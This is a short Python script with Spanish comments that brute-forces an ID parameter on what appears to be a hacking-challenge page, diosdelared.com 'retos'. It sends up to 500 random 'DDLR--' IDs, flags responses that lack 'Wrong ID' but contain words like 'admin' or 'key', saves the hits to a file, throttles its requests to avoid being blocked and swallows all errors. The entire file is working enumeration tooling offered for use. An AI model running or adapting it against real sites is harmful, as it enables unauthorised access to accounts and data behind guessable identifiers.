import requests
import random
import string
import time

# Configuración
URL = "https://www.diosdelared.com/retos/directives/index.php"
OUTPUT_FILE = "resultados_exitosos.txt"
KEYWORDS = ["admin", "key", "random", "success"]  # Palabras clave para éxito
MAX_ATTEMPTS = 500  # Número máximo de combinaciones a probar

# Genera IDs tipo DDLR--ABC (3 letras aleatorias)
def generate_ddlr_id():
    letters = string.ascii_letters  # A-Z, a-z
    random_part = ''.join(random.choice(letters) for _ in range(3))
    return f"DDLR--{random_part}"

# Escaneo
with open(OUTPUT_FILE, "w") as file:
    for attempt in range(1, MAX_ATTEMPTS + 1):
        current_id = generate_ddlr_id()
        try:
            response = requests.get(f"{URL}?id={current_id}", timeout=5)
            response_text = response.text.strip()
            
            # Verifica si es una respuesta exitosa (sin "Wrong ID" y con keywords)
            if (
                "Wrong ID" not in response_text 
                and any(keyword.lower() in response_text.lower() for keyword in KEYWORDS)
            ):
                # Guarda en el archivo
                file.write(f"=== ID {current_id} ===\n")
                file.write(response_text + "\n\n")
                
                # Muestra SOLO el ID exitoso y su respuesta
                print(f"ID Exitoso: {current_id}")
                print(f"Respuesta: {response_text}\n")
            
            time.sleep(0.5)  # Evita bloqueos
            
        except Exception as e:
            pass  # Ignora errores silenciosamente

print("Escaneo completado. Resultados exitosos guardados en:", OUTPUT_FILE)
